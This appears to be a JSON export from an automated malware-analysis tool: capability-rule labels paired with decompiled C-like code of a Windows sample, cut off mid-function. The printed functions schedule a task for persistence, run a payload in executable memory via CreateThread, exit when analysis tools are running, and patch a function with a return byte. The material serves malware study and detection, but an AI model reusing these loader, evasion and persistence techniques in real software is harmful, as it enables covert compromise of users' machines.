{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "140001d2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: pvargDest\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140001d20(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    ulong ****ppppuVar6;\n    uint64_t uVar7;\n    int64_t *piVar8;\n    ulong var_bp_10h;\n    ulong pvargDest;\n    ulong var_bp_30h;\n    ulong var_bp_38h;\n    ulong var_48h;\n    ulong var_50h;\n    ulong var_60h;\n    ulong pvarg;\n    ulong var_bp_78h;\n    ulong var_80h_2;\n    ulong var_90h;\n    ulong var_98h;\n    ulong var_a8h;\n    ulong var_b0h;\n    ulong var_b8h;\n    ulong var_c0h;\n    ulong var_c8h;\n    ulong var_d8h;\n    ulong var_e0h;\n    ulong var_f0h;\n    ulong var_100h;\n    ulong var_110h;\n    ulong var_120h;\n    ulong var_130h;\n    ulong pvargSrc;\n    ulong var_150h;\n    ulong var_160h;\n    ulong var_170h;\n    ulong var_180h;\n    ulong var_190h;\n    ulong var_1a0h;\n    ulong var_1b0h;\n    ulong var_1c0h;\n    ulong var_1c8h;\n    ulong var_1d0h;\n    ulong var_1d8h;\n    ulong lpBuffer;\n    ulong var_1f0h;\n    ulong var_200h;\n    ulong var_210h;\n    ulong var_220h;\n    ulong var_230h;\n    ulong var_240h;\n    ulong var_250h;\n    uchar auStack872 [32];\n    ulong uStack840;\n    ulong uStack832;\n    ulong uStack824;\n    ulong uStack816;\n    int64_t **ppiStack808;\n    int64_t *piStack792;\n    int64_t *piStack784;\n    int64_t *piStack776;\n    ulong uStack768;\n    uint uStack760;\n    uint uStack756;\n    int64_t *piStack752;\n    int64_t *piStack744;\n    int64_t *piStack736;\n    uint auStack728 [2];\n    int64_t *piStack720;\n    int64_t *piStack712;\n    int64_t *piStack704;\n    int64_t *piStack696;\n    int64_t *piStack688;\n    int64_t *piStack680;\n    int64_t *piStack672;\n    int64_t *piStack664;\n    uint uStack656;\n    uint uStack652;\n    ulong uStack648;\n    ulong uStack640;\n    ulong uStack632;\n    uint uStack624;\n    uint uStack620;\n    ulong uStack616;\n    uint uStack608;\n    uint uStack604;\n    ulong uStack600;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uint uStack580;\n    uint uStack576;\n    uint uStack572;\n    ulong uStack568;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    ulong uStack544;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    int64_t *piStack520;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uint uStack500;\n    ulong uStack496;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    ulong uStack472;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    ulong uStack448;\n    int64_t *piStack440;\n    int64_t *piStack432;\n    int64_t *piStack424;\n    uint uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    int64_t *piStack400;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    ulong uStack376;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    int64_t *piStack344;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    ulong uStack312;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    ulong uStack280;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    ulong uStack248;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    ulong uStack216;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    ulong uStack184;\n    ulong ****ppppuStack168;\n    uint uStack160;\n    ushort uStack156;\n    uchar uStack154;\n    uchar uStack153;\n    ulong uStack152;\n    uint64_t uStack144;\n    ulong var_80h;\n    ulong pcbBuffer;\n    ulong var_68h_2;\n    ulong var_60h_2;\n    ulong var_bp_58h;\n    ulong var_50h_2;\n    ulong var_48h_2;\n    ulong var_bp_40h;\n    uchar auStack56 [8];\n    ulong var_bp_28h;\n    uint uStack40;\n    ulong var_bp_18h;\n    uint64_t uStack24;\n    \n    uStack24 = *0x140005030 ^ auStack872;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    piVar8 = NULL;\n    ppiStack808 = NULL;\n    uStack816 = uStack816._4_4_ << 0x20;\n    uStack824 = 0;\n    uStack832 = CONCAT44(uStack832._4_4_, 3);\n    uStack840 = CONCAT44(uStack840._4_4_, 6);\n    (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0);\n    uStack144 = 0xf;\n    uStack152 = 0xf;\n    ppppuStack168 = *0x140001248;\n    uStack160 = *0x140001250;\n    uStack156 = *0x140001254;\n    uStack154 = *0x140001256;\n    uStack153 = 0;\n    piStack752 = NULL;\n    uStack840 = &piStack752;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x140001088, 0, 1, 0x140001068);\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack512);\n    uStack600 = CONCAT44(uStack508, uStack512);\n    uStack592 = uStack504;\n    uStack588 = uStack500;\n    uStack768 = uStack496;\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack536);\n    uStack616 = CONCAT44(uStack532, uStack536);\n    uStack608 = uStack528;\n    uStack604 = uStack524;\n    piStack736 = piStack520;\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack560);\n    uStack632 = CONCAT44(uStack556, uStack560);\n    uStack624 = uStack552;\n    uStack620 = uStack548;\n    piStack792 = uStack544;\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack584);\n    uStack392 = uStack600;\n    uStack388 = uStack600._4_4_;\n    uStack384 = uStack592;\n    uStack380 = uStack588;\n    uStack376 = uStack768;\n    uStack360 = uStack616;\n    uStack356 = uStack616._4_4_;\n    uStack352 = uStack608;\n    uStack348 = uStack604;\n    piStack344 = piStack736;\n    uStack328 = uStack632;\n    uStack324 = uStack632._4_4_;\n    uStack320 = uStack624;\n    uStack316 = uStack620;\n    uStack312 = piStack792;\n    uStack296 = uStack584;\n    uStack292 = uStack580;\n    uStack288 = uStack576;\n    uStack284 = uStack572;\n    uStack280 = uStack568;\n    uStack840 = &uStack392;\n    (**(*piStack752 + 0x50))(piStack752, &uStack296, &uStack328, &uStack360);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack584);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack560);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack536);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n    piStack744 = NULL;\n    piVar3 = fcn.140003668(0x18);\n    piVar5 = piVar8;\n    piStack792 = piVar3;\n    if (piVar3 == NULL) {\ncode_r0x000140001f73:\n        piStack440 = piVar5;\n        if (piVar5 == NULL) goto code_r0x00014000277e;\n        (**(*piStack752 + 0x38))(piStack752, *piVar5, &piStack744);\n        LOCK();\n        piVar3 = piVar5 + 2;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar1 == 1) {\n            if (*piVar5 != 0) {\n                (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                *piVar5 = 0;\n            }\n            if (piVar5[1] != 0) {\n                fcn.140003660();\n                piVar5[1] = 0;\n            }\n            fcn.140003660(piVar5, 0x18);\n        }\n        ppppuVar6 = &ppppuStack168;\n        if (0xf < uStack144) {\n            ppppuVar6 = ppppuStack168;\n        }\n        piVar3 = fcn.140003668(0x18);\n        piVar5 = piVar8;\n        piStack792 = piVar3;\n        if (piVar3 != NULL) {\n            piVar3[1] = 0;\n            *(piVar3 + 2) = 1;\n            iVar4 = fcn.140003310(ppppuVar6);\n            *piVar3 = iVar4;\n            piVar5 = piVar3;\n        }\n        piStack432 = piVar5;\n        if (piVar5 == NULL) goto code_r0x00014000277e;\n        (**(*piStack744 + 0x78))(piStack744, *piVar5, 0);\n        LOCK();\n        piVar3 = piVar5 + 2;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar1 == 1) {\n            if (*piVar5 != 0) {\n                (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                *piVar5 = 0;\n            }\n            if (piVar5[1] != 0) {\n                fcn.140003660();\n                piVar5[1] = 0;\n            }\n            fcn.140003660(piVar5, 0x18);\n        }\n        piStack784 = NULL;\n        (**(*piStack752 + 0x48))(piStack752, 0, &piStack784);\n        (**(*piStack752 + 0x10))();\n        piStack720 = NULL;\n        (**(*piStack784 + 0x38))(piStack784, &piStack720);\n        piVar3 = fcn.140003668(0x18);\n        piVar5 = piVar8;\n        piStack792 = piVar3;\n        if (piVar3 != NULL) {\n            piVar3[1] = 0;\n            *(piVar3 + 2) = 1;\n            iVar4 = fcn.140003310(0x140001260);\n            *piVar3 = iVar4;\n            piVar5 = piVar3;\n        }\n        piStack424 = piVar5;\n        if (piVar5 == NULL) goto code_r0x00014000277e;\n        (**(*piStack720 + 0x50))(piStack720, *piVar5);\n        LOCK();\n        piVar3 = piVar5 + 2;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar1 == 1) {\n            if (*piVar5 != 0) {\n                (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                *piVar5 = 0;\n            }\n            if (piVar5[1] != 0) {\n                fcn.140003660();\n                piVar5[1] = 0;\n            }\n            fcn.140003660(piVar5, 0x18);\n        }\n        (**(*piStack720 + 0x10))();\n        piStack712 = NULL;\n        (**(*piStack784 + 0x58))(piStack784, &piStack712);\n        (**(*piStack712 + 0xb0))(piStack712, 0xffffffff);\n        (**(*piStack712 + 0x10))();\n        piStack704 = NULL;\n        (**(*piStack784 + 0x48))(piStack784, &piStack704);\n        piStack696 = NULL;\n        (**(*piStack704 + 0x50))(piStack704, 8, &piStack696);\n        (**(*piStack704 + 0x10))();\n        piStack776 = NULL;\n        (***piStack696)(piStack696, 0x140001078, &piStack776);\n        (**(*piStack696 + 0x10))();\n        piVar3 = fcn.140003668(0x18);\n        piVar5 = piVar8;\n        piStack792 = piVar3;\n        if (piVar3 != NULL) {\n            piVar3[1] = 0;\n            *(piVar3 + 2) = 1;\n            iVar4 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(0x140001270);\n            *piVar3 = iVar4;\n            piVar5 = piVar3;\n            if (iVar4 != 0) goto code_r0x00014000220b;\n            goto code_r0x00014000275d;\n        }\ncode_r0x00014000220b:\n        piStack400 = piVar5;\n        if (piVar5 == NULL) goto code_r0x00014000277e;\n        (**(*piStack776 + 0x48))(piStack776, *piVar5);\n        LOCK();\n        piVar3 = piVar5 + 2;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar1 == 1) {\n            if (*piVar5 != 0) {\n                (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                *piVar5 = 0;\n            }\n            if (piVar5[1] != 0) {\n                fcn.140003660();\n                piVar5[1] = 0;\n            }\n            fcn.140003660(piVar5, 0x18);\n        }\n        piVar3 = fcn.140003668(0x18);\n        piVar5 = piVar8;\n        piStack792 = piVar3;\n        if (piVar3 != NULL) {\n            piVar3[1] = 0;\n            *(piVar3 + 2) = 1;\n            iVar4 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(0x140001288);\n            *piVar3 = iVar4;\n            piVar5 = piVar3;\n            if (iVar4 != 0) goto code_r0x0001400022a6;\n            goto code_r0x000140002768;\n        }\ncode_r0x0001400022a6:\n        uStack632 = piVar5;\n        if (piVar5 == NULL) goto code_r0x00014000277e;\n        (**(*piStack776 + 0x78))(piStack776, *piVar5);\n        LOCK();\n        piVar3 = piVar5 + 2;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar1 == 1) {\n            if (*piVar5 != 0) {\n                (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                *piVar5 = 0;\n            }\n            if (piVar5[1] != 0) {\n                fcn.140003660();\n                piVar5[1] = 0;\n            }\n            fcn.140003660(piVar5, 0x18);\n        }\n        piVar3 = fcn.140003668(0x18);\n        piVar5 = piVar8;\n        piStack792 = piVar3;\n        if (piVar3 == NULL) {\ncode_r0x00014000233e:\n            uStack616 = piVar5;\n            if (piVar5 == NULL) goto code_r0x00014000277e;\n            (**(*piStack776 + 0x88))(piStack776, *piVar5);\n            LOCK();\n            piVar3 = piVar5 + 2;\n            iVar1 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n            if (iVar1 == 1) {\n                if (*piVar5 != 0) {\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                    *piVar5 = 0;\n                }\n                if (piVar5[1] != 0) {\n                    fcn.140003660();\n                    piVar5[1] = 0;\n                }\n                fcn.140003660(piVar5, 0x18);\n            }\n            piVar3 = fcn.140003668(0x18);\n            piVar5 = piVar8;\n            piStack792 = piVar3;\n            if (piVar3 != NULL) {\n                piVar3[1] = 0;\n                *(piVar3 + 2) = 1;\n                iVar4 = fcn.140003310(0x1400012d8);\n                *piVar3 = iVar4;\n                piVar5 = piVar3;\n            }\n            uStack600 = piVar5;\n            if (piVar5 == NULL) goto code_r0x00014000277e;\n            (**(*piStack776 + 0xa8))(piStack776, *piVar5);\n            LOCK();\n            piVar3 = piVar5 + 2;\n            iVar1 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n            if (iVar1 == 1) {\n                if (*piVar5 != 0) {\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                    *piVar5 = 0;\n                }\n                if (piVar5[1] != 0) {\n                    fcn.140003660();\n                    piVar5[1] = 0;\n                }\n                fcn.140003660(piVar5, 0x18);\n            }\n            (**(*piStack776 + 0x10))();\n            piStack688 = NULL;\n            (**(*piStack784 + 0x88))(piStack784, &piStack688);\n            piStack680 = NULL;\n            (**(*piStack688 + 0x60))(piStack688, 0, &piStack680);\n            (**(*piStack688 + 0x10))();\n            piStack672 = NULL;\n            (***piStack680)(piStack680, 0x140001098, &piStack672);\n            (**(*piStack680 + 0x10))();\n            (**(*piStack672 + 0x58))(piStack672, 0x140001318);\n            (**(*piStack672 + 0x10))();\n            piStack664 = NULL;\n            _var_80h = ZEXT816(0);\n            _pcbBuffer = ZEXT816(0);\n            _var_60h_2 = ZEXT816(0);\n            _var_50h_2 = ZEXT816(0);\n            _var_bp_40h = ZEXT816(0);\n            _auStack56 = ZEXT816(0);\n            uStack40 = 0;\n            auStack728[0] = 100;\n            (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&var_80h, auStack728);\n            (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack464);\n            uStack768 = CONCAT44(uStack460, uStack464);\n            uStack760 = uStack456;\n            uStack756 = uStack452;\n            piStack792 = uStack448;\n            (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack488);\n            uStack416 = uStack488;\n            uStack412 = uStack484;\n            uStack408 = uStack480;\n            uStack404 = uStack476;\n            piStack736 = uStack472;\n            uStack656 = CONCAT22(uStack656._2_2_, 8);\n            uStack648 = fcn.140003310(&var_80h);\n            uStack264 = uStack768;\n            uStack260 = uStack768._4_4_;\n            uStack256 = uStack760;\n            uStack252 = uStack756;\n            uStack248 = piStack792;\n            uStack232 = uStack416;\n            uStack228 = uStack412;\n            uStack224 = uStack408;\n            uStack220 = uStack404;\n            uStack216 = piStack736;\n            uStack648._4_4_ = uStack648 >> 0x20;\n            uStack200 = uStack656;\n            uStack196 = uStack652;\n            uStack192 = uStack648;\n            uStack188 = uStack648._4_4_;\n            uStack184 = uStack640;\n            ppppuVar6 = &ppppuStack168;\n            if (0xf < uStack144) {\n                ppppuVar6 = ppppuStack168;\n            }\n            piVar5 = fcn.140003668(0x18);\n            piStack792 = piVar5;\n            if (piVar5 != NULL) {\n                piVar5[1] = 0;\n                *(piVar5 + 2) = 1;\n                iVar4 = fcn.140003310(ppppuVar6);\n                *piVar5 = iVar4;\n                piVar8 = piVar5;\n            }\n            piStack736 = piVar8;\n            if (piVar8 != NULL) {\n                ppiStack808 = &piStack664;\n                uStack816 = &uStack264;\n                uStack824 = CONCAT44(uStack824._4_4_, 3);\n                uStack832 = &uStack232;\n                uStack840 = &uStack200;\n                (**(*piStack744 + 0x88))(piStack744, *piVar8, piStack784, 6);\n                LOCK();\n                piVar5 = piVar8 + 2;\n                iVar1 = *piVar5;\n                *piVar5 = *piVar5 + -1;\n                if (iVar1 == 1) {\n                    if (*piVar8 != 0) {\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                        *piVar8 = 0;\n                    }\n                    if (piVar8[1] != 0) {\n                        fcn.140003660();\n                        piVar8[1] = 0;\n                    }\n                    fcn.140003660(piVar8, 0x18);\n                }\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack656);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack488);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack464);\n                (**(*piStack744 + 0x10))();\n                (**(*piStack784 + 0x10))();\n                (**(*piStack664 + 0x10))();\n                (*_sym.imp.ole32.dll_CoUninitialize)();\n                if (0xf < uStack144) {\n                    uVar7 = uStack144 + 1;\n                    ppppuVar6 = ppppuStack168;\n                    if (0xfff < uVar7) {\n                        uVar7 = uStack144 + 0x28;\n                        ppppuVar6 = ppppuStack168[-1];\n                        if (0x1f < ppppuStack168 + (-8 - ppppuVar6)) {\n                            (*_sym.imp.api_ms_win_crt_runtime_l1_1_0.dll__invalid_parameter_noinfo_noreturn)();\n                            pcVar2 = swi(3);\n                            (*pcVar2)();\n                            return;\n                        }\n                    }\n                    fcn.140003660(ppppuVar6, uVar7);\n                }\n                fcn.140003640(uStack24 ^ auStack872);\n                return;\n            }\n            fcn.140003300(0x8007000e);\n            goto code_r0x000140002752;\n        }\n        piVar3[1] = 0;\n        *(piVar3 + 2) = 1;\n        iVar4 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(0x1400012b0);\n        *piVar3 = iVar4;\n        piVar5 = piVar3;\n        if (iVar4 != 0) goto code_r0x00014000233e;\n    }\n    else {\n        piVar3[1] = 0;\n        *(piVar3 + 2) = 1;\n        iVar4 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(0x140001258);\n        *piVar3 = iVar4;\n        piVar5 = piVar3;\n        if (iVar4 != 0) goto code_r0x000140001f73;\ncode_r0x000140002752:\n        fcn.140003300(0x8007000e);\ncode_r0x00014000275d:\n        fcn.140003300(0x8007000e);\ncode_r0x000140002768:\n        fcn.140003300(0x8007000e);\n    }\n    fcn.140003300(0x8007000e);\ncode_r0x00014000277e:\n    fcn.140003300(0x8007000e);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 6096
    },
    "140002e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: lpLibFileName\n\nvoid fcn.140002e20(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    ulong uVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar *puVar7;\n    ulong var_bh;\n    ulong lpLibFileName;\n    ulong var_2ch;\n    ulong var_37h;\n    ulong var_3fh;\n    ulong var_4fh;\n    uchar auStack152 [32];\n    uint uStack120;\n    ulong uStack112;\n    uint uStack104;\n    ushort uStack100;\n    ushort uStack96;\n    uchar uStack94;\n    ushort uStack93;\n    uchar uStack91;\n    uint uStack88;\n    uchar uStack84;\n    uint uStack80;\n    uchar uStack76;\n    ushort uStack75;\n    uint uStack72;\n    uchar uStack65;\n    uint uStack64;\n    uchar uStack60;\n    ulong uStack59;\n    uint uStack51;\n    uchar uStack41;\n    ulong uStack40;\n    ushort uStack32;\n    uchar uStack30;\n    ulong uStack29;\n    uint uStack21;\n    uchar n;\n    uchar auStack16 [7];\n    ulong var_1h;\n    \n    _auStack16 = *0x140005030 ^ auStack152;\n    uStack32 = *0x140001350;\n    uStack30 = *0x140001352;\n    uStack29 = 0;\n    uStack21 = 0;\n    n = 0;\n    uStack88 = *0x140001354;\n    uStack84 = *0x140001358;\n    uStack64 = *0x14000135c;\n    uStack60 = *0x140001360;\n    uStack59 = 0;\n    uStack51 = 0;\n    uStack80 = *0x140001364;\n    uStack76 = *0x140001368;\n    uStack75 = 0;\n    uStack96 = *0x14000136c;\n    uStack94 = *0x14000136e;\n    uStack93 = 0;\n    iVar5 = &uStack40 + 7;\n    uStack91 = 0;\n    uStack100 = 0x6c;\n    uStack104 = CONCAT22(uStack104._2_2_, 0x6c);\n    uStack40 = 0x6c416c;\n    uStack72 = 0x636f6c;\n    do {\n        pcVar1 = iVar5 + 1;\n        iVar5 = iVar5 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar6 = 0;\n    do {\n        cVar2 = *(&uStack88 + iVar6);\n        *(iVar5 + iVar6) = cVar2;\n        iVar6 = iVar6 + 1;\n    } while (cVar2 != '\\0');\n    puVar7 = &uStack41;\n    do {\n        pcVar1 = puVar7 + 1;\n        puVar7 = puVar7 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar5 = 0;\n    do {\n        cVar2 = *(&uStack72 + iVar5);\n        puVar7[iVar5] = cVar2;\n        iVar5 = iVar5 + 1;\n    } while (cVar2 != '\\0');\n    iVar5 = &uStack40 + 7;\n    do {\n        pcVar1 = iVar5 + 1;\n        iVar5 = iVar5 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar6 = 0;\n    do {\n        cVar2 = *(&uStack40 + iVar6);\n        *(iVar5 + iVar6) = cVar2;\n        iVar6 = iVar6 + 1;\n    } while (cVar2 != '\\0');\n    puVar7 = &uStack65;\n    do {\n        pcVar1 = puVar7 + 1;\n        puVar7 = puVar7 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar5 = 0;\n    do {\n        cVar2 = *(&uStack80 + iVar5);\n        puVar7[iVar5] = cVar2;\n        iVar5 = iVar5 + 1;\n    } while (cVar2 != '\\0');\n    puVar7 = &uStack65;\n    do {\n        pcVar1 = puVar7 + 1;\n        puVar7 = puVar7 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar5 = 0;\n    do {\n        cVar2 = *(&uStack96 + iVar5);\n        puVar7[iVar5] = cVar2;\n        iVar5 = iVar5 + 1;\n    } while (cVar2 != '\\0');\n    puVar7 = &uStack65;\n    do {\n        pcVar1 = puVar7 + 1;\n        puVar7 = puVar7 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar5 = 0;\n    do {\n        cVar2 = *(&uStack100 + iVar5);\n        puVar7[iVar5] = cVar2;\n        iVar5 = iVar5 + 1;\n    } while (cVar2 != '\\0');\n    puVar7 = &uStack65;\n    do {\n        pcVar1 = puVar7 + 1;\n        puVar7 = puVar7 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar5 = 0;\n    do {\n        cVar2 = *(&uStack104 + iVar5);\n        puVar7[iVar5] = cVar2;\n        iVar5 = iVar5 + 1;\n    } while (cVar2 != '\\0');\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack64);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3, 0x140001370);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack64);\n    pcVar4 = (*pcVar4)(uVar3, &uStack32);\n    uStack104 = 0;\n    iVar5 = fcn.140002b80(uVar3, &uStack104);\n    if ((iVar5 != 0) && (iVar6 = (*pcVar4)(0, uStack104, 0x1000, 0x40),  iVar6 != 0)) {\n        sub.VCRUNTIME140.dll_memcpy(iVar6, iVar5, uStack104);\n        uStack112 = 0;\n        uStack120 = 0;\n        iVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, iVar6, 0);\n        if (iVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar6, 0, 0x8000);\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar5, 0xffffffff);\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar6, 0, 0x8000);\n        }\n    }\n    fcn.140003640(_auStack16 ^ auStack152);\n    return;\n}\n",
        "token_count": 1651
    },
    "1400040f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1400040f8(void)\n\n{\n    int16_t *piVar1;\n    uint64_t uVar2;\n    int32_t *piVar3;\n    \n    piVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar1 == NULL) || (*piVar1 != 0x5a4d)) || (piVar3 = *(piVar1 + 0x1e) + piVar1,  *piVar3 != 0x4550)) ||\n       ((piVar1 = 0x20b,  *(piVar3 + 6) != 0x20b || (piVar3[0x21] < 0xf)))) {\n        uVar2 = piVar1 & 0xffffffffffffff00;\n    }\n    else {\n        uVar2 = CONCAT71(2, piVar3[0x3e] != 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 215
    },
    "14000279": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140002790(ulong arg1, uint64_t arg2, ulong arg3)\n\n{\n    char cVar1;\n    char cVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int64_t iVar6;\n    uint *puVar7;\n    ulong uVar8;\n    ulong uVar9;\n    ulong ****arg3_00;\n    ulong ****ppppuVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    ulong var_1c0h;\n    ulong var_1c8h;\n    ulong var_1d0h;\n    ulong var_1d8h;\n    ulong var_1e0h;\n    ulong var_1e8h;\n    ulong var_1f0h;\n    ulong var_1f8h;\n    ulong var_200h;\n    ulong var_208h;\n    ulong lpExistingFileName;\n    ulong var_320h;\n    uchar auStack1096 [32];\n    uint *puStack1064;\n    uint uStack1056;\n    ulong uStack1048;\n    ulong uStack1040;\n    uchar auStack1032 [4];\n    uint uStack1028;\n    ulong uStack1024;\n    ulong uStack1016;\n    ulong ****appppuStack1008 [2];\n    uint64_t uStack992;\n    uint64_t uStack984;\n    uint uStack968;\n    uchar auStack924 [532];\n    int64_t aiStack392 [4];\n    ulong uStack360;\n    ulong uStack352;\n    ulong uStack344;\n    ulong uStack336;\n    ulong uStack328;\n    ulong uStack320;\n    uint uStack312;\n    ulong var_80h;\n    ulong lpWideCharStr;\n    uint64_t uStack40;\n    \n    uStack40 = *0x140005030 ^ auStack1096;\n    ppppuVar10 = arg2 & 0xffffffff;\n    uVar13 = 0;\n    arg3_00 = 0xffffffffffffffff;\n    if (arg1 != 0) {\n        aiStack392[0] = 0x140001178;\n        aiStack392[1] = 0x140001188;\n        aiStack392[2] = 0x140001198;\n        aiStack392[3] = 0x1400011a8;\n        uStack360 = 0x1400011b8;\n        uStack352 = 0x1400011d0;\n        uStack344 = 0x1400011e0;\n        uStack336 = 0x1400011f0;\n        uStack328 = 0x140001200;\n        uStack320 = 0x140001210;\n        uStack968 = 0x238;\n        iVar6 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n        iVar4 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar6);\n        while (iVar4 != 0) {\n            sub.VCRUNTIME140.dll_memset(&uStack312, 0, 0x104);\n            uStack1040 = 0;\n            uStack1048 = 0;\n            uStack1056 = 0x104;\n            puStack1064 = &uStack312;\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, auStack924, 0xffffffff);\n            uVar12 = uVar13;\n            do {\n                puVar7 = &uStack312;\n                iVar11 = aiStack392[uVar12] - puVar7;\n                do {\n                    cVar1 = *puVar7;\n                    cVar2 = *(puVar7 + iVar11);\n                    if (cVar1 != cVar2) break;\n                    puVar7 = puVar7 + 1;\n                } while (cVar2 != '\\0');\n                if (cVar1 == cVar2) {\n                    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n                    goto code_r0x000140002ae3;\n                }\n                uVar12 = uVar12 + 1;\n            } while (uVar12 < 4);\n            iVar4 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar6);\n        }\n    }\n    if (ppppuVar10 != 0) {\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x140001230);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8, 0x140001220);\n        auStack1032[0] = 0xc3;\n        uStack1028 = 0;\n        uStack1024 = 0x1000;\n        uStack1016 = uVar8;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar9 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x28, 0, uVar5);\n 